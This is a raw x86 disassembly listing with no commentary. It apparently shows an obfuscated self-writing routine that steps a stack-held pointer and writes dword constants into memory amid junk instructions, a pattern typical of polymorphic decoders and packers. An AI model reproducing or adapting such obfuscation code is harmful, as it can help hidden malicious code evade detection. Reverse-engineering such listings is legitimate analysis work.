  40366c:	81 08 01 44 24 e0    	orl    $0xe0244401,(%eax)
  403672:	bf 6a fe 40 00       	mov    $0x40fe6a,%edi
  403677:	33 c0                	xor    %eax,%eax
  403679:	b0 04                	mov    $0x4,%al
  40367b:	01 44 24 e0          	add    %eax,-0x20(%esp)
  40367f:	03 df                	add    %edi,%ebx
  403681:	85 f6                	test   %esi,%esi
  403683:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403687:	81 08 8d ba 79 f9    	orl    $0xf979ba8d,(%eax)
  40368d:	85 f6                	test   %esi,%esi
  40368f:	23 f5                	and    %ebp,%esi
  403691:	66 8b c5             	mov    %bp,%ax
  403694:	33 c0                	xor    %eax,%eax
  403696:	b0 04                	mov    $0x4,%al
  403698:	01 44 24 e0          	add    %eax,-0x20(%esp)
  40369c:	23 f5                	and    %ebp,%esi
  40369e:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  4036a2:	81 09 40 00 8b 4c    	orl    $0x4c8b0040,(%ecx)
  4036a8:	66 8b c5             	mov    %bp,%ax
  4036ab:	33 c0                	xor    %eax,%eax
  4036ad:	b0 04                	mov    $0x4,%al
  4036af:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4036b3:	0f be c7             	movsbl %bh,%eax
  4036b6:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  4036ba:	81 00 24 e0 81 01    	addl   $0x181e024,(%eax)
  4036c0:	66 85 d5             	test   %dx,%bp
  4036c3:	8d 53 02             	lea    0x2(%ebx),%edx
  4036c6:	33 c0                	xor    %eax,%eax
  4036c8:	b0 04                	mov    $0x4,%al
  4036ca:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4036ce:	8d 53 02             	lea    0x2(%ebx),%edx
  4036d1:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  4036d5:	81 03 98 33 fa d0    	addl   $0xd0fa3398,(%ebx)
  4036db:	66 33 ea             	xor    %dx,%bp
  4036de:	33 c0                	xor    %eax,%eax
  4036e0:	b0 04                	mov    $0x4,%al
  4036e2:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4036e6:	66 2b ed             	sub    %bp,%bp
  4036e9:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  4036ed:	c7 00 81 31 19 cc    	movl   $0xcc193181,(%eax)
  4036f3:	66 23 cb             	and    %bx,%cx
  4036f6:	0f a4 c0 03          	shld   $0x3,%eax,%eax
  4036fa:	33 c0                	xor    %eax,%eax
  4036fc:	b0 04                	mov    $0x4,%al
  4036fe:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403702:	0f a4 c0 03          	shld   $0x3,%eax,%eax
  403706:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  40370a:	81 00 fa d1 03 f6    	addl   $0xf603d1fa,(%eax)
  403710:	03 d0                	add    %eax,%edx
  403712:	8d 9f 6b de 40 00    	lea    0x40de6b(%edi),%ebx
  403718:	33 c0                	xor    %eax,%eax
  40371a:	b0 04                	mov    $0x4,%al
  40371c:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403720:	8d 9f 6b de 40 00    	lea    0x40de6b(%edi),%ebx
  403726:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  40372a:	81 03 66 33 cf 0f    	addl   $0xfcf3366,(%ebx)
  403730:	66 23 f1             	and    %cx,%si
  403733:	33 c0                	xor    %eax,%eax
  403735:	b0 04                	mov    $0x4,%al
  403737:	01 44 24 e0          	add    %eax,-0x20(%esp)
  40373b:	66 2b ed             	sub    %bp,%bp
  40373e:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403742:	c7 00 be c5 33 d2    	movl   $0xd233c5be,(%eax)
  403748:	81 f6 f8 fb 40 00    	xor    $0x40fbf8,%esi
  40374e:	33 c0                	xor    %eax,%eax
  403750:	b0 04                	mov    $0x4,%al
  403752:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403756:	66 03 d6             	add    %si,%dx
  403759:	8d 9d ed da 40 00    	lea    0x40daed(%ebp),%ebx
  40375f:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  403763:	81 0a b2 04 01 54    	orl    $0x540104b2,(%edx)
  403769:	8d 9d ed da 40 00    	lea    0x40daed(%ebp),%ebx
  40376f:	33 c0                	xor    %eax,%eax
  403771:	b0 04                	mov    $0x4,%al
  403773:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403777:	33 db                	xor    %ebx,%ebx
  403779:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  40377d:	c7 00 24 e0 66 33    	movl   $0x3366e024,(%eax)
  403783:	85 f6                	test   %esi,%esi
  403785:	23 f5                	and    %ebp,%esi
  403787:	bf 6a fe 40 00       	mov    $0x40fe6a,%edi
  40378c:	33 c0                	xor    %eax,%eax
  40378e:	b0 04                	mov    $0x4,%al
  403790:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403794:	23 f5                	and    %ebp,%esi
  403796:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  40379a:	81 09 cf 8b 44 24    	orl    $0x24448bcf,(%ecx)
  4037a0:	bf 6a fe 40 00       	mov    $0x40fe6a,%edi
  4037a5:	33 c0                	xor    %eax,%eax
  4037a7:	b0 04                	mov    $0x4,%al
  4037a9:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4037ad:	03 df                	add    %edi,%ebx
  4037af:	23 cb                	and    %ebx,%ecx
  4037b1:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  4037b5:	81 08 e0 81 00 2c    	orl    $0x2c0081e0,(%eax)
  4037bb:	23 cb                	and    %ebx,%ecx
  4037bd:	66 2b ed             	sub    %bp,%bp
  4037c0:	33 d9                	xor    %ecx,%ebx
  4037c2:	66 2b f2             	sub    %dx,%si
  4037c5:	33 c0                	xor    %eax,%eax
  4037c7:	b0 04                	mov    $0x4,%al
  4037c9:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4037cd:	66 2b ed             	sub    %bp,%bp
  4037d0:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  4037d4:	c7 00 cf 46 7e 81    	movl   $0x817e46cf,(%eax)
  4037da:	33 d9                	xor    %ecx,%ebx
  4037dc:	33 c0                	xor    %eax,%eax
  4037de:	b0 04                	mov    $0x4,%al
  4037e0:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4037e4:	66 2b f2             	sub    %dx,%si
  4037e7:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  4037eb:	81 08 30 2c cf 34    	orl    $0x34cf2c30,(%eax)
  4037f1:	81 f6 f8 fb 40 00    	xor    $0x40fbf8,%esi
  4037f7:	33 c0                	xor    %eax,%eax
  4037f9:	b0 04                	mov    $0x4,%al
  4037fb:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4037ff:	33 d7                	xor    %edi,%edx
  403801:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403805:	81 00 9e 0f be c5    	addl   $0xc5be0f9e,(%eax)
  40380b:	66 85 f1             	test   %si,%cx
  40380e:	33 db                	xor    %ebx,%ebx
  403810:	b3 04                	mov    $0x4,%bl
  403812:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  403816:	66 23 cb             	and    %bx,%cx
  403819:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  40381d:	c7 00 8b ca 33 c0    	movl   $0xc033ca8b,(%eax)
  403823:	66 33 f1             	xor    %cx,%si
  403826:	33 d2                	xor    %edx,%edx
  403828:	b2 04                	mov    $0x4,%dl
  40382a:	01 54 24 e0          	add    %edx,-0x20(%esp)
  40382e:	66 2b f2             	sub    %dx,%si
  403831:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403835:	81 08 b0 04 01 44    	orl    $0x440104b0,(%eax)
  40383b:	66 03 e9             	add    %cx,%bp
  40383e:	33 c0                	xor    %eax,%eax
  403840:	b0 04                	mov    $0x4,%al
  403842:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403846:	33 d9                	xor    %ecx,%ebx
  403848:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  40384c:	68 24 e0 8b ca       	push   $0xca8be024
  403851:	8b f4                	mov    %esp,%esi
  403853:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403854:	58                   	pop    %eax
  403855:	23 ff                	and    %edi,%edi
  403857:	0b ff                	or     %edi,%edi
  403859:	66 03 e9             	add    %cx,%bp
  40385c:	66 03 e9             	add    %cx,%bp
  40385f:	33 db                	xor    %ebx,%ebx
  403861:	b3 04                	mov    $0x4,%bl
  403863:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  403867:	0b ff                	or     %edi,%edi
  403869:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  40386d:	81 08 8b f6 8b 5c    	orl    $0x5c8bf68b,(%eax)
  403873:	66 03 e9             	add    %cx,%bp
  403876:	33 c0                	xor    %eax,%eax
  403878:	b0 04                	mov    $0x4,%al
  40387a:	01 44 24 e0          	add    %eax,-0x20(%esp)
  40387e:	66 03 e9             	add    %cx,%bp
  403881:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403885:	68 24 e0 81 03       	push   $0x381e024
  40388a:	8b f4                	mov    %esp,%esi
  40388c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40388d:	58                   	pop    %eax
  40388e:	33 d9                	xor    %ecx,%ebx
  403890:	33 c0                	xor    %eax,%eax
  403892:	b0 04                	mov    $0x4,%al
  403894:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403898:	66 2b f2             	sub    %dx,%si
  40389b:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  40389f:	81 08 f4 0a b6 3e    	orl    $0x3eb60af4,(%eax)
  4038a5:	66 03 e9             	add    %cx,%bp
  4038a8:	33 c0                	xor    %eax,%eax
  4038aa:	b0 04                	mov    $0x4,%al
  4038ac:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4038b0:	66 03 e9             	add    %cx,%bp
  4038b3:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  4038b7:	68 81 33 77 ce       	push   $0xce773381
  4038bc:	8b f4                	mov    %esp,%esi
  4038be:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4038bf:	58                   	pop    %eax
  4038c0:	66 03 e9             	add    %cx,%bp
  4038c3:	33 c0                	xor    %eax,%eax
  4038c5:	b0 04                	mov    $0x4,%al
  4038c7:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4038cb:	66 03 e9             	add    %cx,%bp
  4038ce:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  4038d2:	68 a6 61 8b f6       	push   $0xf68b61a6
  4038d7:	8b f4                	mov    %esp,%esi
  4038d9:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4038da:	58                   	pop    %eax
  4038db:	03 f5                	add    %ebp,%esi
  4038dd:	23 f8                	and    %eax,%edi
  4038df:	2b cf                	sub    %edi,%ecx
  4038e1:	33 c0                	xor    %eax,%eax
  4038e3:	b0 04                	mov    $0x4,%al
  4038e5:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4038e9:	23 f8                	and    %eax,%edi
  4038eb:	2b cf                	sub    %edi,%ecx
  4038ed:	8d 9d ed da 40 00    	lea    0x40daed(%ebp),%ebx
  4038f3:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  4038f7:	c7 03 85 cb 81 de    	movl   $0xde81cb85,(%ebx)
  4038fd:	2b cf                	sub    %edi,%ecx
  4038ff:	33 c0                	xor    %eax,%eax
  403901:	b0 04                	mov    $0x4,%al
  403903:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403907:	8d 9d ed da 40 00    	lea    0x40daed(%ebp),%ebx
  40390d:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403911:	81 08 e9 db 40 00    	orl    $0x40dbe9,(%eax)
  403917:	66 33 ed             	xor    %bp,%bp
  40391a:	33 c0                	xor    %eax,%eax
  40391c:	b0 04                	mov    $0x4,%al
  40391e:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403922:	66 85 f6             	test   %si,%si
  403925:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403929:	81 08 33 d2 b2 04    	orl    $0x4b2d233,(%eax)
  40392f:	66 03 e9             	add    %cx,%bp
  403932:	33 c0                	xor    %eax,%eax
  403934:	b0 04                	mov    $0x4,%al
  403936:	01 44 24 e0          	add    %eax,-0x20(%esp)
  40393a:	66 03 e9             	add    %cx,%bp
  40393d:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403941:	68 01 54 24 e0       	push   $0xe0245401
  403946:	8b f4                	mov    %esp,%esi
  403948:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403949:	58                   	pop    %eax
  40394a:	66 23 c9             	and    %cx,%cx
  40394d:	33 c0                	xor    %eax,%eax
  40394f:	b0 04                	mov    $0x4,%al
  403951:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403955:	66 03 c5             	add    %bp,%ax
  403958:	66 8b ca             	mov    %dx,%cx
  40395b:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  40395f:	81 0b 85 cb 8b 54    	orl    $0x548bcb85,(%ebx)
  403965:	66 8b ca             	mov    %dx,%cx
  403968:	33 c9                	xor    %ecx,%ecx
  40396a:	b1 04                	mov    $0x4,%cl
  40396c:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  403970:	03 d9                	add    %ecx,%ebx
  403972:	2b eb                	sub    %ebx,%ebp
  403974:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  403978:	81 09 24 e0 81 02    	orl    $0x281e024,(%ecx)
  40397e:	2b eb                	sub    %ebx,%ebp
  403980:	8d 4e 02             	lea    0x2(%esi),%ecx
  403983:	83 c3 02             	add    $0x2,%ebx
  403986:	33 c9                	xor    %ecx,%ecx
  403988:	b1 04                	mov    $0x4,%cl
  40398a:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  40398e:	8d 4e 02             	lea    0x2(%esi),%ecx
  403991:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  403995:	81 0b ff 38 aa 6b    	orl    $0x6baa38ff,(%ebx)
  40399b:	83 c3 02             	add    $0x2,%ebx
  40399e:	66 8b f0             	mov    %ax,%si
  4039a1:	66 0b c9             	or     %cx,%cx
  4039a4:	33 c0                	xor    %eax,%eax
  4039a6:	b0 04                	mov    $0x4,%al
  4039a8:	01 44 24 e0          	add    %eax,-0x20(%esp)
  4039ac:	66 8b f0             	mov    %ax,%si
  4039af:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  4039b3:	b8 81 32 a2 c6       	mov    $0xc6a23281,%eax
  4039b8:	ab                   	stos   %eax,%es:(%edi)
  4039b9:	66 0b c9             	or     %cx,%cx
  4039bc:	33 c9                	xor    %ecx,%ecx
  4039be:	b1 04                	mov    $0x4,%cl
  4039c0:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  4039c4:	c1 eb 02             	shr    $0x2,%ebx
  4039c7:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  4039cb:	b8 6b e1 81 de       	mov    $0xde81e16b,%eax
  4039d0:	ab                   	stos   %eax,%es:(%edi)
  4039d1:	03 ee                	add    %esi,%ebp
  4039d3:	8d 9d ed da 40 00    	lea    0x40daed(%ebp),%ebx
  4039d9:	33 d2                	xor    %edx,%edx
  4039db:	b2 04                	mov    $0x4,%dl
  4039dd:	01 54 24 e0          	add    %edx,-0x20(%esp)
  4039e1:	8d 9d ed da 40 00    	lea    0x40daed(%ebp),%ebx
  4039e7:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  4039eb:	b8 e9 db 40 00       	mov    $0x40dbe9,%eax
  4039f0:	ab                   	stos   %eax,%es:(%edi)
  4039f1:	8b cd                	mov    %ebp,%ecx
  4039f3:	33 cd                	xor    %ebp,%ecx
  4039f5:	8d ba ef ff 40 00    	lea    0x40ffef(%edx),%edi
  4039fb:	33 c9                	xor    %ecx,%ecx
  4039fd:	b1 04                	mov    $0x4,%cl
  4039ff:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  403a03:	33 cd                	xor    %ebp,%ecx
  403a05:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  403a09:	81 0a 33 db b3 04    	orl    $0x4b3db33,(%edx)
  403a0f:	8d ba ef ff 40 00    	lea    0x40ffef(%edx),%edi
  403a15:	33 db                	xor    %ebx,%ebx
  403a17:	b3 04                	mov    $0x4,%bl
  403a19:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  403a1d:	c1 c7 02             	rol    $0x2,%edi
  403a20:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  403a24:	81 09 01 5c 24 e0    	orl    $0xe0245c01,(%ecx)
  403a2a:	66 23 c2             	and    %dx,%ax
  403a2d:	33 c9                	xor    %ecx,%ecx
  403a2f:	b1 04                	mov    $0x4,%cl
  403a31:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  403a35:	8d 40 02             	lea    0x2(%eax),%eax
  403a38:	81 c0 fa fd 40 00    	add    $0x40fdfa,%eax
  403a3e:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403a42:	b8 66 33 ed 8b       	mov    $0x8bed3366,%eax
  403a47:	ab                   	stos   %eax,%es:(%edi)
  403a48:	81 c0 fa fd 40 00    	add    $0x40fdfa,%eax
  403a4e:	8d 8d 7c fc 40 00    	lea    0x40fc7c(%ebp),%ecx
  403a54:	33 d2                	xor    %edx,%edx
  403a56:	b2 04                	mov    $0x4,%dl
  403a58:	01 54 24 e0          	add    %edx,-0x20(%esp)
  403a5c:	8d 8d 7c fc 40 00    	lea    0x40fc7c(%ebp),%ecx
  403a62:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403a66:	b8 4c 24 e0 81       	mov    $0x81e0244c,%eax
  403a6b:	ab                   	stos   %eax,%es:(%edi)
  403a6c:	66 03 d0             	add    %ax,%dx
  403a6f:	33 c9                	xor    %ecx,%ecx
  403a71:	b1 04                	mov    $0x4,%cl
  403a73:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  403a77:	8b ce                	mov    %esi,%ecx
  403a79:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403a7d:	b8 01 c9 e7 66       	mov    $0x66e7c901,%eax
  403a82:	ab                   	stos   %eax,%es:(%edi)
  403a83:	66 2b fb             	sub    %bx,%di
  403a86:	0f be ce             	movsbl %dh,%ecx
  403a89:	bb f8 fd 40 00       	mov    $0x40fdf8,%ebx
  403a8e:	33 c0                	xor    %eax,%eax
  403a90:	b0 04                	mov    $0x4,%al
  403a92:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403a96:	0f be ce             	movsbl %dh,%ecx
  403a99:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403a9d:	b8 91 81 31 cd       	mov    $0xcd318191,%eax
  403aa2:	ab                   	stos   %eax,%es:(%edi)
  403aa3:	bb f8 fd 40 00       	mov    $0x40fdf8,%ebx
  403aa8:	66 03 c8             	add    %ax,%cx
  403aab:	33 c9                	xor    %ecx,%ecx
  403aad:	b1 04                	mov    $0x4,%cl
  403aaf:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  403ab3:	66 03 c8             	add    %ax,%cx
  403ab6:	2b d0                	sub    %eax,%edx
  403ab8:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  403abc:	81 0b fe ec 85 2b    	orl    $0x2b85ecfe,(%ebx)
  403ac2:	2b d0                	sub    %eax,%edx
  403ac4:	66 33 d8             	xor    %ax,%bx
  403ac7:	66 03 d2             	add    %dx,%dx
  403aca:	33 db                	xor    %ebx,%ebx
  403acc:	b3 04                	mov    $0x4,%bl
  403ace:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  403ad2:	66 33 d8             	xor    %ax,%bx
  403ad5:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  403ad9:	81 0a d8 0b c1 33    	orl    $0x33c10bd8,(%edx)
  403adf:	66 03 d2             	add    %dx,%dx
  403ae2:	33 d2                	xor    %edx,%edx
  403ae4:	b2 04                	mov    $0x4,%dl
  403ae6:	01 54 24 e0          	add    %edx,-0x20(%esp)
  403aea:	0f c1 e8             	xadd   %ebp,%eax
  403aed:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403af1:	81 08 c0 b0 04 01    	orl    $0x104b0c0,(%eax)
  403af7:	8d ae e9 ff 40 00    	lea    0x40ffe9(%esi),%ebp
  403afd:	33 db                	xor    %ebx,%ebx
  403aff:	b3 04                	mov    $0x4,%bl
  403b01:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  403b05:	c1 fb 02             	sar    $0x2,%ebx
  403b08:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403b0c:	b8 44 24 e0 0b       	mov    $0xbe02444,%eax
  403b11:	ab                   	stos   %eax,%es:(%edi)
  403b12:	2b d9                	sub    %ecx,%ebx
  403b14:	0f be cc             	movsbl %ah,%ecx
  403b17:	0b d9                	or     %ecx,%ebx
  403b19:	33 db                	xor    %ebx,%ebx
  403b1b:	b3 04                	mov    $0x4,%bl
  403b1d:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  403b21:	0f be cc             	movsbl %ah,%ecx
  403b24:	0b d9                	or     %ecx,%ebx
  403b26:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403b2a:	b8 c1 66 23 c6       	mov    $0xc62366c1,%eax
  403b2f:	ab                   	stos   %eax,%es:(%edi)
  403b30:	0b d9                	or     %ecx,%ebx
  403b32:	66 23 c5             	and    %bp,%ax
  403b35:	33 c9                	xor    %ecx,%ecx
  403b37:	b1 04                	mov    $0x4,%cl
  403b39:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  403b3d:	66 23 c5             	and    %bp,%ax
  403b40:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  403b44:	81 0a 8b 4c 24 e0    	orl    $0xe0244c8b,(%edx)
  403b4a:	f7 e5                	mul    %ebp
  403b4c:	c1 c1 02             	rol    $0x2,%ecx
  403b4f:	85 c6                	test   %eax,%esi
  403b51:	33 d2                	xor    %edx,%edx
  403b53:	b2 04                	mov    $0x4,%dl
  403b55:	01 54 24 e0          	add    %edx,-0x20(%esp)
  403b59:	c1 c1 02             	rol    $0x2,%ecx
  403b5c:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403b60:	b8 81 01 18 88       	mov    $0x88180181,%eax
  403b65:	ab                   	stos   %eax,%es:(%edi)
  403b66:	85 c6                	test   %eax,%esi
  403b68:	c1 e1 02             	shl    $0x2,%ecx
  403b6b:	66 2b cf             	sub    %di,%cx
  403b6e:	33 db                	xor    %ebx,%ebx
  403b70:	b3 04                	mov    $0x4,%bl
  403b72:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  403b76:	c1 e1 02             	shl    $0x2,%ecx
  403b79:	66 2b cf             	sub    %di,%cx
  403b7c:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403b80:	b8 04 1a 66 23       	mov    $0x23661a04,%eax
  403b85:	ab                   	stos   %eax,%es:(%edi)
  403b86:	66 2b cf             	sub    %di,%cx
  403b89:	33 db                	xor    %ebx,%ebx
  403b8b:	b3 04                	mov    $0x4,%bl
  403b8d:	01 5c 24 e0          	add    %ebx,-0x20(%esp)
  403b91:	8b e8                	mov    %eax,%ebp
  403b93:	23 fa                	and    %edx,%edi
  403b95:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403b99:	81 08 c6 8b e9 8d    	orl    $0x8de98bc6,(%eax)
  403b9f:	23 fa                	and    %edx,%edi
  403ba1:	8d 6e 02             	lea    0x2(%esi),%ebp
  403ba4:	33 c0                	xor    %eax,%eax
  403ba6:	b0 04                	mov    $0x4,%al
  403ba8:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403bac:	8d 6e 02             	lea    0x2(%esi),%ebp
  403baf:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403bb3:	81 00 9e 6f f9 40    	addl   $0x40f96f9e,(%eax)
  403bb9:	23 db                	and    %ebx,%ebx
  403bbb:	33 c9                	xor    %ecx,%ecx
  403bbd:	b1 04                	mov    $0x4,%cl
  403bbf:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  403bc3:	66 03 e9             	add    %cx,%bp
  403bc6:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403bca:	68 00 33 d2 b2       	push   $0xb2d23300
  403bcf:	8b f4                	mov    %esp,%esi
  403bd1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403bd2:	58                   	pop    %eax
  403bd3:	66 8b c0             	mov    %ax,%ax
  403bd6:	33 c0                	xor    %eax,%eax
  403bd8:	b0 04                	mov    $0x4,%al
  403bda:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403bde:	66 8b f0             	mov    %ax,%si
  403be1:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403be5:	81 00 04 01 54 24    	addl   $0x24540104,(%eax)
  403beb:	66 0b ef             	or     %di,%bp
  403bee:	33 c0                	xor    %eax,%eax
  403bf0:	b0 04                	mov    $0x4,%al
  403bf2:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403bf6:	66 03 e9             	add    %cx,%bp
  403bf9:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403bfd:	68 e0 8b e9 8d       	push   $0x8de98be0
  403c02:	8b f4                	mov    %esp,%esi
  403c04:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403c05:	58                   	pop    %eax
  403c06:	8b fb                	mov    %ebx,%edi
  403c08:	66 85 c8             	test   %cx,%ax
  403c0b:	33 c0                	xor    %eax,%eax
  403c0d:	b0 04                	mov    $0x4,%al
  403c0f:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403c13:	66 85 c8             	test   %cx,%ax
  403c16:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403c1a:	b8 9e 6f f9 40       	mov    $0x40f96f9e,%eax
  403c1f:	ab                   	stos   %eax,%es:(%edi)
  403c20:	23 de                	and    %esi,%ebx
  403c22:	33 c9                	xor    %ecx,%ecx
  403c24:	b1 04                	mov    $0x4,%cl
  403c26:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  403c2a:	0b fd                	or     %ebp,%edi
  403c2c:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403c30:	81 00 00 8b 4c 24    	addl   $0x244c8b00,(%eax)
  403c36:	03 f5                	add    %ebp,%esi
  403c38:	85 f1                	test   %esi,%ecx
  403c3a:	66 33 df             	xor    %di,%bx
  403c3d:	8d 90 6a fe 40 00    	lea    0x40fe6a(%eax),%edx
  403c43:	33 c0                	xor    %eax,%eax
  403c45:	b0 04                	mov    $0x4,%al
  403c47:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403c4b:	85 f1                	test   %esi,%ecx
  403c4d:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  403c51:	81 0a e0 81 01 88    	orl    $0x880181e0,(%edx)
  403c57:	66 33 df             	xor    %di,%bx
  403c5a:	33 c0                	xor    %eax,%eax
  403c5c:	b0 04                	mov    $0x4,%al
  403c5e:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403c62:	8d 90 6a fe 40 00    	lea    0x40fe6a(%eax),%edx
  403c68:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403c6c:	81 00 14 18 30 8d    	addl   $0x8d301814,(%eax)
  403c72:	0f be db             	movsbl %bl,%ebx
  403c75:	33 c0                	xor    %eax,%eax
  403c77:	b0 04                	mov    $0x4,%al
  403c79:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403c7d:	66 03 df             	add    %di,%bx
  403c80:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403c84:	b8 9e 6f f9 40       	mov    $0x40f96f9e,%eax
  403c89:	ab                   	stos   %eax,%es:(%edi)
  403c8a:	23 cb                	and    %ebx,%ecx
  403c8c:	0f be de             	movsbl %dh,%ebx
  403c8f:	33 c0                	xor    %eax,%eax
  403c91:	b0 04                	mov    $0x4,%al
  403c93:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403c97:	0f be de             	movsbl %dh,%ebx
  403c9a:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403c9e:	68 00 33 d2 b2       	push   $0xb2d23300
  403ca3:	8b f4                	mov    %esp,%esi
  403ca5:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403ca6:	58                   	pop    %eax
  403ca7:	66 2b c2             	sub    %dx,%ax
  403caa:	0b d7                	or     %edi,%edx
  403cac:	c1 ff 02             	sar    $0x2,%edi
  403caf:	33 d2                	xor    %edx,%edx
  403cb1:	b2 04                	mov    $0x4,%dl
  403cb3:	01 54 24 e0          	add    %edx,-0x20(%esp)
  403cb7:	0b d7                	or     %edi,%edx
  403cb9:	c1 ff 02             	sar    $0x2,%edi
  403cbc:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  403cc0:	c7 01 04 01 54 24    	movl   $0x24540104,(%ecx)
  403cc6:	c1 ff 02             	sar    $0x2,%edi
  403cc9:	85 ee                	test   %ebp,%esi
  403ccb:	33 c0                	xor    %eax,%eax
  403ccd:	b0 04                	mov    $0x4,%al
  403ccf:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403cd3:	85 ee                	test   %ebp,%esi
  403cd5:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403cd9:	81 00 e0 66 2b f7    	addl   $0xf72b66e0,(%eax)
  403cdf:	66 0b e9             	or     %cx,%bp
  403ce2:	33 c0                	xor    %eax,%eax
  403ce4:	b0 04                	mov    $0x4,%al
  403ce6:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403cea:	66 03 f0             	add    %ax,%si
  403ced:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403cf1:	81 08 66 33 f1 8b    	orl    $0x8bf13366,(%eax)
  403cf7:	85 f6                	test   %esi,%esi
